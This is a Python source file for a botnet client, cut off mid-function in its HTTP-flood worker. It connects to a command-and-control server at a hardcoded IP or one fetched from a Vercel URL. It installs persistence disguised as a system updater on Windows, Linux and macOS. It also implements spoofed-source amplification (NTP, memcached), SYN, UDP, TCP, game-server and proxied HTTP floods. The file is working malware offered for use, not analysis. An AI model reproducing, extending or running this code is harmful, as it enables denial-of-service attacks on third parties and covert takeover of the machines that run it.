#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Standard Imports
import socket
import threading
import time
import random
import os
import sys
import struct
import platform
import subprocess
import re # Used for cleaning user agents
import json # For potential future config or structured data
from struct import pack as data_pack
from multiprocessing import Process # Used by httpio (available on most non-minimal systems)
from urllib.parse import urlparse # Used by httpSpoofAttack

# --- Conditional Imports & Dependency Checks ---
# Import platform-specific or optional libraries only if needed and available.

# Scapy imports - requires root/Administrator on many systems and 'pip install scapy'
SCAPY_AVAILABLE = False
try:
    from scapy.all import IP, UDP, Raw, ICMP, send as scapy_send
    from scapy.layers.inet import IP # Redundant but kept from original
    from scapy.layers.inet import TCP
    SCAPY_AVAILABLE = True
except ImportError:
    print("Warning: Scapy not installed or import failed. L3, SYN, NTP, MEM attacks may not work.")
    # Define placeholder functions if Scapy is not available to prevent NameErrors
    def scapy_send(*args, **kwargs): pass # print("Scapy send called but not available.")
    IP = None; UDP = None; Raw = None; ICMP = None; TCP = None

# icmplib import - requires 'pip install icmplib'
ICMPLIB_AVAILABLE = False
try:
    from icmplib import ping as pig
    ICMPLIB_AVAILABLE = True
except ImportError:
    print("Warning: icmplib not installed. ICMP attack fallback may not work.")
    def pig(*args, **kwargs): pass # print("icmplib ping called but not available.")


# HTTP/Proxy imports - requires 'pip install requests cloudscraper PySocks'
REQUESTS_AVAILABLE = False
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    print("Warning: requests not installed. HTTP attacks may not work.")
    requests = None

CLOUDSCRAPER_AVAILABLE = False
if REQUESTS_AVAILABLE: # cloudscraper depends on requests
    try:
        import cloudscraper
        CLOUDSCRAPER_AVAILABLE = True
    except ImportError:
        print("Warning: cloudscraper not installed. HTTP attacks may not work efficiently.")
        cloudscraper = None
else:
     cloudscraper = None # Ensure it's None if requests isn't there


SOCKS_AVAILABLE = False
try:
    import socks # Used by httpSpoofAttack
    SOCKS_AVAILABLE = True
except ImportError:
    print("Warning: PySocks not installed. HTTPSPOOF attack may not work.")
    socks = None

SSL_AVAILABLE = False # ssl is usually built-in, but check defensively
try:
    import ssl # Used by httpSpoofAttack (built-in, but good to check)
    SSL_AVAILABLE = True
except ImportError: # This import usually doesn't fail
    print("Warning: ssl module not available.")
    ssl = None


# Persistence imports (Windows specific) - requires 'pip install pywin32'
SYSTEM_INFO = platform.system().lower() # Get system info early
WINREG_AVAILABLE = False
if SYSTEM_INFO == 'windows':
    try:
        import winreg
        WINREG_AVAILABLE = True
    except ImportError:
        print("Warning: pywin32 not installed. Windows persistence may not work.")
else:
    WINREG_AVAILABLE = False # Not applicable to other OS

# --- CNC Connection Details ---
# Primary: Vercel IP/Port (dynamic)
# Secondary: Hardcoded IP/Port (fallback)
VERCEL_IP_FETCH_URL = "https://ipport.vercel.app/ip?key=2504"
VERCEL_PORT_FETCH_URL = "https://ipport.vercel.app/port?key=2504"
FALLBACK_C2_ADDRESS = "51.38.140.80" # <-- **REPLACE THIS** with a reliable static IP
FALLBACK_C2_PORT = 5511            # <-- **REPLACE THIS** with your CNC port

# Global variables for connection state
VERCEL_C2_ADDRESS = None
VERCEL_C2_PORT = None
USE_VERCEL = True # Flag to prioritize Vercel
LAST_VERCEL_CHECK_TIME = 0
VERCEL_CHECK_INTERVAL = 600 # Check Vercel every 10 minutes (in seconds)


# --- Bot Authentication Details (Matches cnc.py handle_client) ---
BOT_AUTH_STRING = b'669787761736865726500'
EXPECTED_BOT_USERNAME = b'BOT'
EXPECTED_BOT_PASSWORD = b'\xff\xff\xff\xff=' # These are Telnet IAC WILL ECHO bytes

# --- Global Variables ---
cnc_socket = None
attack_threads = [] # Keep track of attack threads (optional, for monitoring/management)
external_lists = { # Store loaded server/proxy lists
    'ntp_servers': [],
    'memsv': [],
    'socks_proxies': [],
    'http_proxies': []
}
active_attacks_count = 0 # Simple counter for active attack threads
start_time = time.time() # Initialize start time

# Event to signal connection switch (e.g., from fallback to Vercel)
switch_connection_event = threading.Event()


# --- Helper Functions ---

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
]

def rand_ua():
    """Generates a random user agent string."""
    chosen_user_agent = random.choice(base_user_agents)
    try:
        # Attempt to format with random values
        formatted_ua = chosen_user_agent.format(
            random.random() + 5, # Windows NT version
            random.random() + random.randint(1, 8), # Gecko/rv version parts
            random.random(),
            random.randint(2000, 2100), # Gecko date stamp
            random.randint(92215, 99999),
            random.random() + random.randint(3, 9), # Browser version parts
            random.random()
        )
         # Use re.sub to handle any potential remaining % style format specifiers
        return re.sub(r'%\.[0-9]f|%d', lambda x: str(random.randint(1, 10) if 'd' in x.group(0) else round(random.random() * 10, int(x.group(0)[2]))), formatted_ua)

    except Exception:
        # Fallback to a standard UA if formatting fails
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'


def detect_system():
    """Detect the system architecture and OS."""
    system_info = {
        'os': SYSTEM_INFO, # Use the early detection
        'architecture': platform.machine().lower(),
        'distro': '', # Linux distro
        'is_iot': False # Flag for potential IoT devices
    }

    iot_arches = ['mips', 'arm', 'aarch64', 'riscv']
    if any(arch in system_info['architecture'] for arch in iot_arches):
        system_info['is_iot'] = True

    if system_info['os'] == 'linux':
        try:
            # Prefer newer os-release
            if os.path.exists('/etc/os-release'):
                 with open('/etc/os-release') as f:
                    for line in f:
                        if line.startswith('ID='):
                            system_info['distro'] = line.split('=')[1].strip().strip('"')
                            break
            # Fallback to older lsb-release
            elif os.path.exists('/etc/lsb-release'):
                 with open('/etc/lsb-release') as f:
                     for line in f:
                         if line.startswith('DISTRIB_ID='):
                             system_info['distro'] = line.split('=')[1].strip()
                             break
        except Exception:
            pass # Ignore errors reading release files

    return system_info

def add_persistence(system_info):
    """Add persistence mechanism based on the detected system."""
    try:
        current_script_path = os.path.abspath(__file__)
        if system_info['os'] == 'windows' and WINREG_AVAILABLE:
            # Registry Run key persistence
            key = winreg.HKEY_CURRENT_USER # Use HKCU as it doesn't require admin by default
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                # Check if the value already exists
                reg_exists = False
                try:
                     with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key_read:
                         value, reg_type = winreg.QueryValueEx(reg_key_read, "SystemUpdater")
                         # Check if the value exists and matches the current script path (case-insensitive)
                         if value and isinstance(value, str) and value.strip('"').lower() == current_script_path.lower():
                              reg_exists = True
                except FileNotFoundError: # Key might not exist
                     pass
                except Exception: # Value might not exist, or wrong type
                     pass

                if not reg_exists:
                     with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as reg_key:
                         # Use quotes around path and executable for safety, even if path has spaces
                         reg_value = f'"{sys.executable}" "{current_script_path}"'
                         winreg.SetValueEx(reg_key, "SystemUpdater", 0, winreg.REG_SZ, reg_value)
                         print("Windows persistence added to HKCU Run key.")
                # else: print("Windows persistence already exists in HKCU Run key.") # Optional

            except Exception as e:
                 print(f"Warning: Windows persistence failed (HKCU): {e}. Trying HKLM (requires admin)...")
                 # Fallback to HKLM (requires Administrator privileges)
                 key_hklm = winreg.HKEY_LOCAL_MACHINE
                 subkey_hklm = r"Software\Microsoft\Windows\CurrentVersion\Run"
                 try:
                     # Check if the value already exists in HKLM
                     reg_exists_hklm = False
                     try:
                          with winreg.OpenKey(key_hklm, subkey_hklm, 0, winreg.KEY_READ) as reg_key_read_hklm:
                              value_hklm, reg_type_hklm = winreg.QueryValueEx(reg_key_read_hklm, "SystemUpdater")
                              if value_hklm and isinstance(value_hklm, str) and value_hklm.strip('"').lower() == current_script_path.lower():
                                   reg_exists_hklm = True
                     except FileNotFoundError: pass # Key might not exist
                     except Exception: pass # Value might not exist, or wrong type

                     if not reg_exists_hklm:
                          with winreg.OpenKey(key_hklm, subkey_hklm, 0, winreg.KEY_WRITE) as reg_key_hklm:
                              reg_value = f'"{sys.executable}" "{current_script_path}"'
                              winreg.SetValueEx(reg_key_hklm, "SystemUpdater", 0, winreg.REG_SZ, reg_value)
                              print("Windows persistence added to HKLM Run key (requires admin).")
                     # else: print("Windows persistence already exists in HKLM Run key.") # Optional
                 except Exception as e_hklm:
                      print(f"Warning: Windows persistence failed (HKLM, requires admin): {e_hklm}")


        elif system_info['os'] == 'linux':
            # Attempt systemd persistence first (more modern and reliable)
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {current_script_path}
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
            service_path = '/etc/systemd/system/system-update.service'
            try:
                # Check if service file exists and has correct ExecStart
                service_correct = False
                if os.path.exists(service_path):
                     with open(service_path, 'r') as f:
                         if f"ExecStart={sys.executable} {current_script_path}" in f.read():
                             service_correct = True

                if not service_correct:
                    with open(service_path, 'w') as f:
                        f.write(service_content)
                    # systemctl commands require root
                    subprocess.run(['systemctl', 'daemon-reload'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    subprocess.run(['systemctl', 'enable', 'system-update.service'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    subprocess.run(['systemctl', 'start', 'system-update.service'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    print("Linux (Systemd) persistence added and started (requires root).")
                # else: print("Linux (Systemd) persistence already exists and is correct.") # Optional

            except Exception as e:
                 print(f"Warning: Linux (Systemd) persistence failed (requires root?): {e}. Trying Cron...")
                 # Fallback to cron persistence
                 if system_info['is_iot']: # IoT devices often use cron
                      cron_file = '/etc/crontab' # System crontab needs root
                 else:
                      # User crontab - does NOT require root, but less reliable (user might disable)
                      # Use `crontab -l` and `crontab -`
                      cron_file = None # Indicate user crontab approach

                 cron_line = f"@reboot {sys.executable} {current_script_path} >/dev/null 2>&1 &\n"

                 if cron_file == '/etc/crontab':
                      try:
                          cron_exists = False
                          if os.path.exists(cron_file):
                              with open(cron_file, 'r') as f:
                                  if cron_line in f.read():
                                       cron_exists = True

                          if not cron_exists:
                              with open(cron_file, 'a') as f: # Requires root
                                  f.write(cron_line)
                              print(f"Linux Cron persistence added to {cron_file} (requires root).")
                          # else: print(f"Linux Cron persistence already exists in {cron_file}.") # Optional
                      except Exception as e_cron:
                           print(f"Warning: Linux Cron persistence failed ({cron_file}): {e_cron}")
                 else: # User crontab
                      try:
                           result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, check=False) # check=False to handle no crontab existing
                           existing_crontab = result.stdout if result.returncode == 0 else ""
                           if cron_line not in existing_crontab:
                                new_crontab = existing_crontab + cron_line
                                process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                                stdout, stderr = process.communicate(input=new_crontab.encode('utf-8'))
                                if process.returncode == 0:
                                     print("Linux user crontab persistence added.")
                                else:
                                     print(f"Warning: Linux user crontab persistence failed: {stderr.decode('utf-8', errors='ignore').strip()}")
                           # else: print("Linux user crontab persistence already exists.") # Optional
                      except FileNotFoundError:
                           print("Warning: 'crontab' command not found for user crontab persistence.")
                      except Exception as e_user_cron:
                           print(f"Warning: Linux user crontab persistence failed: {e_user_cron}")


        elif system_info['os'] == 'darwin':  # macOS
            # macOS persistence via launchd
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{current_script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</string>
    <string>/dev/null</string>
</dict>
</plist>
"""
            # Use user's LaunchAgents directory (~/Library/LaunchAgents) - does NOT require root
            plist_dir = os.path.expanduser('~/Library/LaunchAgents')
            plist_path = os.path.join(plist_dir, 'com.apple.systemupdate.plist')

            try:
                # Ensure directory exists
                os.makedirs(plist_dir, exist_ok=True)

                # Check if plist exists and has correct ProgramArguments
                plist_correct = False
                if os.path.exists(plist_path):
                     import plistlib # plistlib is usually built-in
                     try:
                         with open(plist_path, 'rb') as f:
                             existing_plist = plistlib.load(f)
                             if existing_plist.get('ProgramArguments') == [sys.executable, current_script_path] and existing_plist.get('Label') == 'com.apple.systemupdate':
                                  plist_correct = True
                     except Exception: # Handle errors reading or parsing plist
                         pass

                if not plist_correct:
                    with open(plist_path, 'w') as f:
                        f.write(plist_content)
                    # Load the plist using launchctl - user level does not require sudo
                    # Use -w flag to make it persistent across reboots
                    subprocess.run(['launchctl', 'load', '-w', plist_path], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    print("macOS launchd persistence added and loaded.")
                # else: print("macOS launchd persistence already exists and is correct.") # Optional

            except Exception as e:
                 print(f"Warning: macOS launchd persistence failed: {e}")

    except Exception as e:
        print(f"Warning: General persistence setup failed: {e}")


def spoofer():
    """Generates a random looking IP address."""
    # Generates a random IP in ranges often used for spoofing (excluding common private/reserved ranges)
    parts = [str(random.randrange(1, 255)) for _ in range(4)] # Avoid 0 and 255 in octets
    return '.'.join(parts)

def remove_by_value(arr, val):
    """Removes all occurrences of a value from a list."""
    return [item for item in arr if item != val]

def load_external_lists():
    """Loads server and proxy lists from files in the script's directory."""
    global external_lists

    # Define list files in the script's directory
    list_files = {
        'ntp_servers': 'ntpServers.txt',
        'memsv': 'memsv.txt',
        'socks_proxies': 'socks4.txt', # Assuming socks4/5 proxies in this file
        'http_proxies': 'http_proxies.txt' # Assuming a separate file for HTTP proxies
    }

    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Helper to load a list file
    def _load_list_file(filename):
        filepath = os.path.join(script_dir, filename) # Path in script's directory
        items = []
        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    items = [line.strip() for line in f if line.strip() and not line.startswith('#')] # Ignore empty lines and comments
                print(f"Loaded {len(items)} items from '{filename}'.")
            except Exception as e:
                print(f"Error loading list file '{filename}': {e}")
                items = [] # Ensure it's an empty list on error
        else:
            print(f"Warning: List file '{filename}' not found in script directory. Continuing without it.")
            # Optionally create empty file
            try:
                with open(filepath, 'w', encoding='utf-8') as f: pass
                # print(f"Created empty '{filename}'.") # Optional
            except Exception: pass # Ignore error creating file
        return items

    for key, filename in list_files.items():
        external_lists[key] = _load_list_file(filename) # Call helper with just filename

# --- Attack Method Implementations ---

# NOTE: Attack functions accept necessary external lists and capability flags as arguments.
# They also increment/decrement the active_attacks_count global via the wrapper.

def _attack_thread_wrapper(attack_func, *args, **kwargs):
    """Wrapper to handle attack count and exception logging."""
    global active_attacks_count
    thread_name = threading.current_thread().name
    print(f"[{thread_name}] Attack started.")
    active_attacks_count += 1
    try:
        attack_func(*args, **kwargs)
    except Exception as e:
        print(f"[{thread_name}] Error during attack: {e}")
        import traceback
        traceback.print_exc() # Print traceback for attack errors
        # Optional: Send error back to CNC if supported
    finally:
        active_attacks_count -= 1
        print(f"[{thread_name}] Attack finished.")


# L3 Attack Methods
def icmp_method(target, timer, scapy_available, icmplib_available):
    if not scapy_available and not icmplib_available:
        print("ICMP attack requires Scapy or icmplib.")
        return

    end_time = time.time() + int(timer)
    print(f"Starting ICMP attack on {target} for {timer} seconds...")

    # Check for root if Scapy is the only option
    if scapy_available and not icmplib_available:
         if os.name != 'nt' and os.geteuid() != 0:
             print("Warning: ICMP attack (Scapy) requires root privileges. Attack may fail.")
         # Windows Scapy raw socket requires special setup

    while time.time() < end_time:
        try:
            packet_size = random.randint(1024, 60000)
            if scapy_available:
                icmp_packet = IP(dst=target)/ICMP()/("X"*packet_size)
                scapy_send(icmp_packet, count=1, verbose=False)
            elif icmplib_available:
                 # Fallback to icmplib
                 try:
                      pig(target, count=5, interval=0.05, payload_size=packet_size, payload=b"X"*packet_size, timeout=0.1)
                 except Exception: # icmplib can throw exceptions
                      pass
            # If neither is available, the check at the start should have returned.

        except Exception as e:
            # print(f"ICMP send error: {e}") # Optional detailed error
            pass # Ignore errors and continue flooding


def pod_method(target, timer, scapy_available):
    if not scapy_available:
        print("POD attack requires Scapy.")
        return

    end_time = time.time() + int(timer)
    print(f"Starting POD attack on {target} for {timer} seconds...")

    # POD requires crafting oversized packets, best done with raw sockets (Scapy).
    # Requires root/Administrator.
    if os.name != 'nt': # Not Windows
        if os.geteuid() != 0:
            print("Warning: POD attack requires root privileges. Attack may be less effective or fail.")
    # Windows requires specific setup for raw sockets used by Scapy.

    while time.time() < end_time:
        try:
            rand_addr = spoofer()
            packet = IP(src=rand_addr, dst=target)/ICMP()/("X"*65500) # Approaches maximum packet size
            scapy_send(packet, count=1, verbose=False)
        except Exception as e:
            # print(f"POD send error: {e}") # Optional detailed error
            pass # Ignore errors and continue


# Amplification Attack Methods
# These use spoofed source IPs, which requires raw sockets (Scapy).
def ntp_method(target_src_ip, port, timer, ntp_servers, scapy_available):
    if not scapy_available:
        print("NTP attack requires Scapy.")
        return
    if not ntp_servers:
        print("NTP attack requires a list of NTP servers.")
        return
    # Requires root/Administrator for spoofing via raw sockets.
    if os.name != 'nt': # Not Windows
        if os.geteuid() != 0:
            print("Warning: NTP attack (spoofing) requires root privileges. Attack may fail.")

    end_time = time.time() + int(timer)
    ntp_payload = b"\x17\x00\x03\x2a" + b"\x00" * 4 # NTP MONLIST request (or similar amplification)

    print(f"Starting NTP attack with spoofed source {target_src_ip} for {timer} seconds...")

    packets_per_burst = random.randint(10, 150) # packets per scapy_send call

    while time.time() < end_time:
        try:
            server = random.choice(ntp_servers)
            # Craft the packet using the provided target_src_ip as source
            packet = IP(dst=server, src=target_src_ip) / UDP(sport=random.randint(1, 65535), dport=int(port)) / Raw(load=ntp_payload)
            # Sending in bursts
            scapy_send(packet, count=packets_per_burst, verbose=False)
        except Exception as e:
            # print(f"NTP send error: {e}") # Optional detailed error
            pass # Ignore errors and continue


def mem_method(target_src_ip, port, timer, memsv_servers, scapy_available):
    if not scapy_available:
        print("MEM attack requires Scapy.")
        return
    if not memsv_servers:
        print("MEM attack requires a list of Memcached servers.")
        return
    # Requires root/Administrator for spoofing via raw sockets.
    if os.name != 'nt': # Not Windows
        if os.geteuid() != 0:
            print("Warning: MEM attack (spoofing) requires root privileges. Attack may fail.")

    end_time = time.time() + int(timer)
    mem_payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" # Memcached stats request

    print(f"Starting MEM attack with spoofed source {target_src_ip} for {timer} seconds...")

    while time.time() < end_time:
        try:
            server = random.choice(memsv_servers)
            # Craft the packet using the provided target_src_ip as source
            packet = IP(dst=server, src=target_src_ip) / UDP(sport=int(port), dport=11211) / Raw(load=mem_payload)
            scapy_send(packet, count=1, verbose=False)
        except Exception as e:
            # print(f"MEM send error: {e}") # Optional detailed error
            pass # Ignore errors and continue


# L4 Attack Methods
def udp_method(ip, port, secs, size):
    end_time = time.time() + int(secs)
    target_port = int(port) if int(port) != 0 else random.randint(1, 65535)
    packet_size = int(size)
    print(f"Starting UDP attack on {ip}:{target_port} for {secs} seconds with size {packet_size}...")
    while time.time() < end_time:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = os.urandom(packet_size)
            s.sendto(data, (ip, target_port))
        except Exception as e:
            # print(f"UDP send error: {e}") # Optional detailed error
            pass
        finally:
            if s: s.close()


def tcp_method(ip, port, secs, size):
    end_time = time.time() + int(secs)
    target_port = int(port)
    packet_size = int(size)
    print(f"Starting TCP attack on {ip}:{target_port} for {secs} seconds with size {packet_size}...")
    while time.time() < end_time:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5) # Short timeout for connection
            s.connect((ip, target_port))
            s.settimeout(None) # Remove timeout after connection
            data = os.urandom(packet_size)
            # Send data in a tight loop while attack is still running and socket is connected
            while time.time() < end_time:
                try:
                    s.sendall(data) # Use sendall
                    # time.sleep(0.001) # Optional small sleep
                except socket.error:
                     break # Break inner loop if send fails (connection likely closed)

        except (socket.error, socket.timeout) as e:
            # print(f"TCP connection/send error: {e}") # Optional detailed error
            pass
        except Exception as e:
             # print(f"TCP attack unexpected error: {e}") # Optional detailed error
             pass
        finally:
            if s:
                try: s.close()
                except: pass


def syn_method(ip, port, secs, scapy_available):
    if not scapy_available:
        print("SYN attack requires Scapy.")
        return

    end_time = time.time() + int(secs)
    target_port = int(port)
    print(f"Starting SYN attack on {ip}:{target_port} for {secs} seconds...")

    # SYN flood requires crafting raw packets, best done with raw sockets (Scapy).
    # Requires root/Administrator.
    if os.name != 'nt': # Not Windows
        if os.geteuid() != 0:
            print("Warning: SYN attack requires root privileges. Attack may fail.")
    # Windows requires specific setup for raw sockets used by Scapy.

    while time.time() < end_time:
        try:
            # Craft a SYN packet with spoofed source IP and random source port
            src_ip = spoofer()
            src_port = random.randint(1024, 65535) # Random source port

            ip_layer = IP(src=src_ip, dst=ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S") # S flag for SYN

            packet = ip_layer / tcp_layer

            # Send the packet
            scapy_send(packet, count=1, verbose=False) # Send one packet at a time

        except Exception as e:
            # print(f"SYN send error: {e}") # Optional detailed error
            pass


def tup_method(ip, port, secs, size):
    end_time = time.time() + int(secs)
    target_port = int(port) # TUP uses the same port for TCP and UDP based on original code
    packet_size = int(size)
    print(f"Starting TUP (TCP/UDP) attack on {ip}:{target_port} for {secs} seconds with size {packet_size}...")
    while time.time() < end_time:
        udp_sock = None
        tcp_sock = None
        try:
            # UDP send
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_dport = random.randint(1, 65535) if target_port == 0 else target_port # Use random UDP port if 0
            data = os.urandom(packet_size) # Use os.urandom
            udp_sock.sendto(data, (ip, udp_dport))

            # TCP connection attempt and send
            tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_sock.settimeout(3) # Short timeout for TCP connect
            tcp_sock.connect((ip, target_port))
            tcp_sock.settimeout(None) # Remove timeout
            tcp_sock.sendall(data) # Send data once per successful connection

        except (socket.error, socket.timeout) as e:
            # print(f"TUP connection/send error: {e}") # Optional detailed error
            pass
        except Exception as e:
             # print(f"TUP attack unexpected error: {e}") # Optional detailed error
             pass
        finally:
            if udp_sock:
                try: udp_sock.close()
                except: pass
            if tcp_sock:
                try: tcp_sock.close()
                except: pass


def hex_method(ip, port, secs, size):
    end_time = time.time() + int(secs)
    target_port = int(port) if int(port) != 0 else random.randint(1, 65535)
    packet_size = int(size)
    # HEX flood often sends packets with specific byte patterns, or just raw random bytes.
    # Sticking to sending random data for simplicity as the original wasn't provided.
    # If 'HEX' implies a specific protocol, this needs implementing.
    print(f"Starting HEX attack on {ip}:{target_port} for {secs} seconds with size {packet_size} (sending random data)...")
    while time.time() < end_time:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Assuming UDP for HEX
            data = os.urandom(packet_size) # Use os.urandom
            # If a specific HEX pattern is needed: data = bytes.fromhex("AABBCCDD") + os.urandom(packet_size - 4)
            s.sendto(data, (ip, target_port))
        except Exception as e:
             # print(f"HEX send error: {e}") # Optional detailed error
             pass
        finally:
            if s: s.close()


def junk_method(ip, port, secs, size):
     end_time = time.time() + int(secs)
     target_port = int(port) if int(port) != 0 else random.randint(1, 65535)
     packet_size = int(size)
     print(f"Starting JUNK attack on {ip}:{target_port} for {secs} seconds with size {packet_size}...")
     while time.time() < end_time:
         s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Assuming UDP for JUNK
             data = os.urandom(packet_size)
             s.sendto(data, (ip, target_port))
         except Exception as e:
              # print(f"JUNK send error: {e}") # Optional detailed error
              pass
         finally:
              if s: s.close()


# Game Attack Methods (assuming UDP floods with potential specific packets)
def roblox_method(ip, port, secs, size):
     end_time = time.time() + int(secs)
     # Roblox typically uses UDP on ports in the 57xxx range, but the command allows specifying one.
     target_port = int(port) if int(port) != 0 else random.randint(57000, 57999) # Default Roblox range
     packet_size = int(size)
     print(f"Starting ROBLOX attack on {ip}:{target_port} for {secs} seconds with size {packet_size}...")
     while time.time() < end_time:
         s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             data = os.urandom(packet_size)
             s.sendto(data, (ip, target_port))
         except Exception as e:
              # print(f"ROBLOX send error: {e}") # Optional detailed error
              pass
         finally:
              if s: s.close()

def vse_method(ip, port, secs, size):
     end_time = time.time() + int(secs)
     # VSE query floods often involve specific UDP packets on default port 27015.
     target_port = int(port) if int(port) != 0 else 27015 # Default VSE port
     packet_size = int(size)
     print(f"Starting VSE attack on {ip}:{target_port} for {secs} seconds with size {packet_size}...")
     while time.time() < end_time:
         s = None
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             # Craft a simple VSE query packet (A2S_INFO) or send random data if size requires.
             query_packet = b'\xff\xff\xff\xffTSource Engine Query\x00'
             data_to_send = os.urandom(packet_size) if packet_size > len(query_packet) else query_packet
             # If size is smaller than query, send random. If larger, send query + random.
             if packet_size < len(query_packet): data_to_send = os.urandom(packet_size)
             else: data_to_send = query_packet + os.urandom(packet_size - len(query_packet))

             s.sendto(data_to_send, (ip, target_port))
         except Exception as e:
              # print(f"VSE send error: {e}") # Optional detailed error
              pass
         finally:
              if s: s.close()


# L7 Attack Methods (require requests, cloudscraper, etc.)
def httpspoof_method(url, port, timer, socks_proxies, socks_available, ssl_available, requests_available):
    if not socks_available or not ssl_available or not requests_available:
        print("HTTPSPOOF attack requires PySocks, ssl, and requests.")
        return
    if not socks_proxies:
        print("HTTPSPOOF attack requires a list of SOCKS proxies (socks4.txt).")
        return

    end_time = time.time() + int(timer)
    try:
        parsed_url = urlparse(url)
        target_host = parsed_url.netloc
        if not target_host:
            print(f"Invalid URL for HTTPSPOOF: {url}")
            return

        target_path = parsed_url.path if parsed_url.path else "/"
        use_ssl = parsed_url.scheme == 'https'

    except Exception as e:
        print(f"Error parsing URL {url} for HTTPSPOOF: {e}")
        return

    print(f"Starting HTTPSPOOF attack on {url} (via proxies) for {timer} seconds...")

    while time.time() < end_time:
        s = None
        try:
            proxy_address, proxy_port_str = random.choice(socks_proxies).split(":")
            proxy_port = int(proxy_port_str)

            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy_address, proxy_port) # Original used SOCKS5
            s.settimeout(5) # Short timeout for proxy connection
            s.connect((target_host, int(port))) # Connect to target host:port via proxy

            if use_ssl:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target_host)

            s.settimeout(None) # Reset timeout after connection

            req = f"GET {target_path} HTTP/1.1\r\nHost: {target_host}\r\n"
            req += f"User-Agent: {rand_ua()}\r\n"
            req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
            # Add Spoofed Headers
            req += f"X-Forwarded-Proto: {'https' if use_ssl else 'http'}\r\n"
            req += f"X-Forwarded-Host: {target_host}, {spoofer()}\r\n"
            req += f"Via: {spoofer()}\r\n"
            req += f"Client-IP: {spoofer()}\r\n"
            req += f"X-Forwarded-For: {spoofer()}\r\n"
            req += f"Real-IP: {spoofer()}\r\n"
            req += "Connection: Keep-Alive\r\n\r\n"

            # Send multiple requests in a burst per connection attempt
            for _ in range(100):
                try:
                    s.sendall(req.encode('utf-8'))
                    # time.sleep(0.001) # Optional small sleep
                except (socket.error, ssl.SSLError) as e:
                    # print(f"HTTPSPOOF send error: {e}") # Optional
                    break # Break inner send loop on error

        except (socks.SocksError, socket.error, ssl.SSLError, ValueError) as e:
            # print(f"HTTPSPOOF connection/proxy error: {e}") # Optional
            pass # Ignore errors and try next proxy/connection
        except Exception as e:
             print(f"HTTPSPOOF unexpected error: {e}") # Log unexpected error
             pass
        finally:
            if s:
                try: s.close()
                except: pass


def _http_runner_process(target, cfbp, http_proxies, requests_available, cloudscraper_available):
    """Process worker for HTTPIO attack."""
    if not requests_available or (cfbp in [1] and not cloudscraper_available):
         print("HTTPIO process dependencies not met.")
         return # Cannot run if dependencies are missing

    # Use a persistent session within the process
    session = requests.Session()
    if cfbp in [1, 2] and cloudscraper_available: # Mode 1 (NORMAL) or 2 (direct) uses CloudScraper
        scraper = cloudscraper.create_scraper(sess=session)
    else:
        scraper = None # Will use plain requests session

    proxies_list = list(http_proxies) # Work with a mutable list copy

    while True: # Keep running until the parent process is killed
        try:
